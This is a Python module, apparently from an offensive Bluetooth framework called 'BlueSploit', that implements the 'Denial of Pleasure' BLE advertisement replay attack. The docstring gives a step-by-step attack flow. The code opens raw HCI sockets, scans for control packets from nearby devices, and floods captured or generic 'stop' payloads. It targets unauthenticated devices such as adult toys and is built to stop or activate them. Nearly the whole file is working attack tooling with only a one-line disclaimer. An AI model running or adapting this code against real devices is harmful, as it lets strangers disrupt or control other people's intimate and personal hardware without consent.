"""
BlueSploit Module: Denial of Pleasure

Replay attack against BLE devices controlled via unauthenticated
advertisement packets, no pairing required, no authentication, pure
broadcast injection over HCI LE advertising commands.

Discovered by Mando Mat (2023) targeting Love Spouse app adult toys, but
the technique applies to ANY BLE device that accepts control commands
via BLE ADV_IND packets without pairing or encryption.

Attack flow:
  1. Capture a BLE advertisement control packet with nRF Connect / Wireshark
     (filter: LE_META → LE Advertising Report → data field)
  2. Copy the raw advertising payload hex (max 31 bytes)
  3. Feed it to this module, it injects the payload via HCI LE Set
     Advertising Data + LE Set Advertise Enable
  4. Device receives the spoofed broadcast and executes the command
     (stop vibration = DoS, or replay start = activation)

Modes:
  replay , continuously broadcast a captured advertisement payload
  stop   , broadcast an all-stop payload (0 intensity) for known protocols
  scan   , passive scan to capture target advertisements for 30s
  check  , verify HCI adapter supports LE advertising

The HCI path (raw socket / hcitool cmd) is the exact mechanism used:
  OGF=0x08 OCF=0x0006  LE_Set_Advertising_Parameters
  OGF=0x08 OCF=0x0008  LE_Set_Advertising_Data
  OGF=0x08 OCF=0x000A  LE_Set_Advertise_Enable

No third-party BLE library required, only BlueZ + hciconfig + hcitool.

References:
  https://mandomat.github.io/2023-11-13-denial-of-pleasure/
  https://github.com/mandomat/denial-of-pleasure
"""

from __future__ import annotations

import os
import select
import socket
import struct
import subprocess
import time
from typing import List, Optional, Tuple

from core.base import DosModule, ModuleInfo, ModuleOption, BTProtocol, Severity
from core.utils.printer import (
    print_success, print_error, print_info, print_warning, Colors,
)


# ── HCI constants ────────────────────────────────────────────────────────────

AF_BLUETOOTH    = 31
BTPROTO_HCI     = 1
SOL_HCI         = 0
HCI_FILTER      = 2

HCI_COMMAND_PKT = 0x01
HCI_EVENT_PKT   = 0x04
HCI_ACL_PKT     = 0x02

OGF_LE          = 0x08
OCF_LE_SET_ADV_PARAMS   = 0x0006
OCF_LE_SET_ADV_DATA     = 0x0008
OCF_LE_SET_ADV_ENABLE   = 0x000A
OCF_LE_SET_SCAN_PARAMS  = 0x000B
OCF_LE_SET_SCAN_ENABLE  = 0x000C

EVT_CMD_COMPLETE = 0x0E
EVT_LE_META      = 0x3E
LE_ADV_REPORT    = 0x02

def _opcode(ogf: int, ocf: int) -> int:
    return (ogf << 10) | ocf


def _run(cmd: List[str], timeout: int = 5) -> Tuple[int, str, str]:
    try:
        r = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
        return r.returncode, r.stdout, r.stderr
    except Exception as e:
        return 1, "", str(e)


# ── HCI helper ───────────────────────────────────────────────────────────────

class HCI:
    """Thin raw-HCI socket wrapper for LE advertising commands."""

    def __init__(self, dev_id: int = 0):
        self.dev_id = dev_id
        self.sock: Optional[socket.socket] = None

    def open(self) -> None:
        s = socket.socket(AF_BLUETOOTH, socket.SOCK_RAW, BTPROTO_HCI)
        s.bind((self.dev_id,))
        # struct hci_filter: type_mask(4) + event_mask[0](4) + event_mask[1](4) + opcode(2) = 14 bytes
        # MUST be exactly 14, kernel silently ignores wrong sizes.
        flt = struct.pack("<IIIH",
                          (1 << HCI_EVENT_PKT),  # only care about events
                          0xFFFFFFFF,             # all event bits [0]
                          0xFFFFFFFF,             # all event bits [1]
                          0)                      # opcode filter off
        try:
            s.setsockopt(SOL_HCI, HCI_FILTER, flt)
        except OSError:
            pass
        s.settimeout(3.0)
        self.sock = s

    def close(self) -> None:
        if self.sock:
            try: self.sock.close()
            except Exception: pass
            self.sock = None

    def cmd(self, opcode: int, params: bytes = b"") -> bool:
        """Send HCI command, wait for matching Command Complete, return success."""
        pkt = struct.pack("<BHB", HCI_COMMAND_PKT, opcode, len(params)) + params
        self.sock.send(pkt)
        # HCI CMD COMPLETE: type(1) evt(1) plen(1) ncmd(1) opcode_le(2) status(1)
        deadline = time.time() + 3.0
        while time.time() < deadline:
            try:
                buf = self.sock.recv(256)
            except socket.timeout:
                return False
            if not buf or buf[0] != HCI_EVENT_PKT:
                continue
            if buf[1] == EVT_CMD_COMPLETE and len(buf) >= 7:
                returned_opcode = struct.unpack_from("<H", buf, 4)[0]
                if returned_opcode != opcode:
                    continue  # not our command's response
                status = buf[6]
                return status == 0x00
        return False

    # ── LE advertising ───────────────────────────────────────────────────────

    def le_adv_enable(self, enable: bool) -> bool:
        return self.cmd(_opcode(OGF_LE, OCF_LE_SET_ADV_ENABLE),
                        bytes([0x01 if enable else 0x00]))

    def le_set_adv_params(self,
                          min_interval: int = 0x00A0,   # 100ms
                          max_interval: int = 0x00A0,
                          adv_type: int = 0x03,          # ADV_NONCONN_IND (no conn)
                          own_addr_type: int = 0x00,
                          peer_addr_type: int = 0x00,
                          peer_addr: bytes = b"\x00" * 6,
                          channel_map: int = 0x07,       # all 3 channels
                          filter_policy: int = 0x00) -> bool:
        params = struct.pack(
            "<HHBBB6sBB",
            min_interval, max_interval, adv_type,
            own_addr_type, peer_addr_type,
            peer_addr, channel_map, filter_policy,
        )
        return self.cmd(_opcode(OGF_LE, OCF_LE_SET_ADV_PARAMS), params)

    def le_set_adv_data(self, data: bytes) -> bool:
        """Set advertising data, data max 31 bytes, padded to exactly 31."""
        if len(data) > 31:
            raise ValueError("Advertising data max 31 bytes")
        padded = data + b"\x00" * (31 - len(data))
        return self.cmd(_opcode(OGF_LE, OCF_LE_SET_ADV_DATA),
                        bytes([len(data)]) + padded)

    # ── LE scanning ──────────────────────────────────────────────────────────

    def le_scan_enable(self, enable: bool, active: bool = False) -> bool:
        self.cmd(_opcode(OGF_LE, OCF_LE_SET_SCAN_PARAMS),
                 struct.pack("<BHHBB",
                             0x01 if active else 0x00,   # scan type
                             0x0010, 0x0010,              # interval, window
                             0x00, 0x00))                 # addr type, filter
        return self.cmd(_opcode(OGF_LE, OCF_LE_SET_SCAN_ENABLE),
                        bytes([0x01 if enable else 0x00, 0x00]))

    def recv_adv_reports(self, timeout: float = 0.5) -> List[dict]:
        """Drain buffered LE Advertising Reports. Returns list of dicts."""
        reports = []
        self.sock.settimeout(timeout)
        try:
            while True:
                buf = self.sock.recv(2048)
                if not buf or buf[0] != HCI_EVENT_PKT:
                    continue
                if buf[1] != EVT_LE_META or len(buf) < 5:
                    continue
                if buf[3] != LE_ADV_REPORT:
                    continue
                num = buf[4]
                off = 5
                for _ in range(num):
                    if off + 9 > len(buf):
                        break
                    evt_type = buf[off]; off += 1
                    addr_type = buf[off]; off += 1
                    addr = ":".join(f"{b:02X}" for b in reversed(buf[off:off+6]))
                    off += 6
                    dlen = buf[off]; off += 1
                    data = buf[off:off+dlen]; off += dlen
                    rssi = struct.unpack_from("b", buf, off)[0]; off += 1
                    reports.append({
                        "type": evt_type,
                        "addr_type": addr_type,
                        "addr": addr,
                        "data": data,
                        "data_hex": data.hex(),
                        "rssi": rssi,
                    })
        except (socket.timeout, OSError):
            pass
        return reports


# ── Module ───────────────────────────────────────────────────────────────────

class Module(DosModule):
    """
    Denial of Pleasure

    Replays captured BLE control advertisements against unauthenticated
    BLE devices (no pairing, no encryption required).
    """

    info = ModuleInfo(
        name="Denial of Pleasure",
        description=(
            "Replay BLE advertisement control packets to DoS or activate "
            "devices using unauthenticated broadcast commands (CVE-less, "
            "protocol design flaw)"
        ),
        author=["Mando Mat"],
        protocol=BTProtocol.BLE,
        severity=Severity.MEDIUM,
        cve=None,
        references=[
            "https://mandomat.github.io/2023-11-13-denial-of-pleasure/",
        ],
    )

    def _setup_options(self) -> None:
        self.add_option(ModuleOption(
            name="mode", required=True,
            description="Mode: check, scan, replay, stop",
            default="check",
        ))
        self.add_option(ModuleOption(
            name="interface", required=False,
            description="Local HCI adapter",
            default="hci0",
        ))
        self.add_option(ModuleOption(
            name="payload_hex", required=False,
            description=(
                "Captured advertisement payload hex (max 31 bytes). "
                "Example: 0201060e095645524f204352 ..."
            ),
            default=None,
        ))
        self.add_option(ModuleOption(
            name="duration", required=False,
            description="Replay / scan duration in seconds",
            default=30,
        ))
        self.add_option(ModuleOption(
            name="interval_ms", required=False,
            description="Advertisement interval in ms (lower = faster flood)",
            default=100,
        ))
        self.add_option(ModuleOption(
            name="filter_addr", required=False,
            description="Scan mode: only print adverts from this BD_ADDR",
            default=None,
        ))

    # ── Validation ──────────────────────────────────────────────────────────

    def check(self) -> bool:
        mode = (self.get_option("mode") or "check").lower()
        if mode not in ("check", "scan", "replay", "stop"):
            print_error(f"Invalid mode: {mode}")
            return False
        if mode == "replay":
            ph = self.get_option("payload_hex")
            if not ph:
                print_error("replay mode requires payload_hex")
                return False
            try:
                data = bytes.fromhex(ph.replace(" ", "").replace(":", ""))
                if len(data) > 31:
                    print_error("payload_hex must be ≤ 31 bytes")
                    return False
            except ValueError:
                print_error("payload_hex is not valid hex")
                return False
        return True

    # ── Driver ──────────────────────────────────────────────────────────────

    def run(self) -> bool:
        if not self.check():
            return False
        if os.geteuid() != 0:
            print_error("Root required (raw HCI socket)")
            return False

        mode = (self.get_option("mode") or "check").lower()
        iface = self.get_option("interface") or "hci0"
        dev_id = int(iface.replace("hci", ""))
        duration = int(self.get_option("duration") or 30)
        interval_ms = int(self.get_option("interval_ms") or 100)

        C = Colors
        print(f"\n  {C.RED}╔{'═'*60}╗{C.RESET}")
        print(f"  {C.RED}║{C.RESET} {C.BOLD}Denial of Pleasure{C.RESET}          {C.RED}║{C.RESET}")
        print(f"  {C.RED}╚{'═'*60}╝{C.RESET}\n")

        print_info(f"Mode      : {mode}")
        print_info(f"Adapter   : {iface}")
        print_warning("DISCLAIMER: For authorized security testing only!")

        if mode == "check":
            return self._do_check(iface, dev_id)
        if mode == "scan":
            return self._do_scan(dev_id, duration, self.get_option("filter_addr"))
        if mode == "replay":
            payload = bytes.fromhex(
                self.get_option("payload_hex").replace(" ", "").replace(":", ""))
            return self._do_replay(dev_id, payload, duration, interval_ms)
        if mode == "stop":
            return self._do_stop_flood(dev_id, duration, interval_ms)
        return False

    # ── check ────────────────────────────────────────────────────────────────

    def _do_check(self, iface: str, dev_id: int) -> bool:
        ok = True

        print_info(f"\n[1/3] Adapter present?")
        rc, out, _ = _run(["hciconfig", iface])
        if rc != 0:
            print_error(f"{iface} not found"); ok = False
        else:
            print_success(f"{iface} found")
            if "DOWN" in out:
                print_warning(f"{iface} is DOWN, run: hciconfig {iface} up")

        print_info("[2/3] Raw HCI socket openable?")
        try:
            h = HCI(dev_id)
            h.open()
            h.close()
            print_success("HCI raw socket OK")
        except OSError as e:
            print_error(f"HCI open failed: {e}"); ok = False

        print_info("[3/3] LE Set Advertising Params command accepted?")
        try:
            h = HCI(dev_id)
            h.open()
            # Disable advertising first (ignore errors)
            h.le_adv_enable(False)
            r = h.le_set_adv_params()
            h.close()
            if r:
                print_success("LE advertising supported on this adapter")
            else:
                print_warning("LE Set Adv Params returned non-zero status, "
                              "adapter may not support LE or is busy")
                ok = False
        except OSError as e:
            print_error(f"HCI command failed: {e}"); ok = False

        if ok:
            print_success("\nReady, set mode=replay and supply payload_hex")
        return ok

    # ── scan ─────────────────────────────────────────────────────────────────

    def _do_scan(self, dev_id: int, duration: int,
                 filter_addr: Optional[str]) -> bool:
        print_info(f"\nPassive LE scan for {duration}s, capture control packets")
        print_info("Tip: look for repeated short payloads from the same address")
        if filter_addr:
            print_info(f"Filtering to: {filter_addr.upper()}")

        try:
            h = HCI(dev_id)
            h.open()
            h.le_adv_enable(False)
            h.le_scan_enable(True, active=False)
        except OSError as e:
            print_error(f"HCI open/scan: {e}")
            return False

        seen: dict = {}
        deadline = time.time() + duration
        count = 0

        try:
            while time.time() < deadline:
                for rpt in h.recv_adv_reports(timeout=0.5):
                    addr = rpt["addr"]
                    if filter_addr and addr.upper() != filter_addr.upper():
                        continue
                    key = (addr, rpt["data_hex"])
                    first = key not in seen
                    seen[key] = seen.get(key, 0) + 1
                    count += 1
                    if first or seen[key] % 20 == 0:
                        print_success(
                            f"  [{addr}] rssi={rpt['rssi']} "
                            f"type=0x{rpt['type']:02X} "
                            f"data={rpt['data_hex']} "
                            f"(seen {seen[key]}x)"
                        )
        except KeyboardInterrupt:
            print_warning("Scan interrupted by user")
        finally:
            try:
                h.le_scan_enable(False)
                h.close()
            except Exception:
                pass

        print_info(f"\nCaptured {count} advertisement events, {len(seen)} unique (addr, data) pairs")
        if seen:
            print_info("Copy the data hex of the control packet and use:")
            print_info("  set mode replay")
            print_info("  set payload_hex <hex>")
            print_info("  run")
        self.add_result({"mode": "scan", "unique_pairs": len(seen), "total_events": count})
        return count > 0

    # ── replay ───────────────────────────────────────────────────────────────

    def _do_replay(self, dev_id: int, payload: bytes,
                   duration: int, interval_ms: int) -> bool:
        iv = max(interval_ms, 20)
        iv_units = int(iv * 1000 / 625)  # HCI unit = 0.625ms

        print_info(f"\nReplaying {len(payload)} byte payload for {duration}s")
        print_info(f"  Payload : {payload.hex()}")
        print_info(f"  Interval: {iv}ms ({iv_units} HCI units)")

        try:
            h = HCI(dev_id)
            h.open()
        except OSError as e:
            print_error(f"HCI open: {e}")
            return False

        ok = False
        try:
            h.le_adv_enable(False)

            if not h.le_set_adv_params(
                min_interval=iv_units, max_interval=iv_units,
                adv_type=0x03,          # ADV_NONCONN_IND, no connection req
                own_addr_type=0x00,
                channel_map=0x07,
            ):
                print_warning("LE Set Adv Params returned error, continuing anyway")

            if not h.le_set_adv_data(payload):
                print_error("LE Set Adv Data failed, adapter may not support LE")
                return False
            print_success("Advertising data set")

            if not h.le_adv_enable(True):
                print_error("LE Set Advertise Enable failed")
                return False
            print_success(f"Advertising started, broadcasting for {duration}s (Ctrl+C to stop)")

            deadline = time.time() + duration
            tx = 0
            try:
                while time.time() < deadline:
                    elapsed = deadline - time.time()
                    print(f"\r  Broadcasting… {elapsed:.0f}s remaining     ",
                          end="", flush=True)
                    time.sleep(1)
                    tx += int(1000 / max(iv, 1))
            except KeyboardInterrupt:
                print_warning("\nStopped by user")

            print()
            h.le_adv_enable(False)
            print_success(f"Done, approximately {tx} advertisements sent")
            ok = True
            self.add_result({
                "mode": "replay",
                "payload_hex": payload.hex(),
                "duration_s": duration,
                "interval_ms": iv,
                "est_broadcasts": tx,
            })
        finally:
            try:
                h.le_adv_enable(False)
                h.close()
            except Exception:
                pass
        return ok

    # ── stop-flood ───────────────────────────────────────────────────────────

    def _do_stop_flood(self, dev_id: int, duration: int, interval_ms: int) -> bool:
        """
        Broadcast a generic BLE 'stop' pattern, 0x00 intensity / all zeros.
        For devices that use length-prefixed type-value payloads, zero payload
        often maps to 'stop all motors'.  Adjust payload_hex if needed.
        """
        # Generic stop: complete local name = "STOP", value all-zero control
        stop_payload = bytes([
            0x02, 0x01, 0x06,                    # Flags
            0x09, 0x09, 0x53, 0x54, 0x4F, 0x50, 0x00, 0x00, 0x00,   # Name: STOP
            0x03, 0xFF, 0x00, 0x00,              # Manufacturer specific: 0x0000
        ])
        print_info("Broadcasting generic stop-pattern (0 intensity)")
        print_info("Override with: set payload_hex <device-specific-stop-packet>")
        return self._do_replay(dev_id, stop_payload, duration, interval_ms)
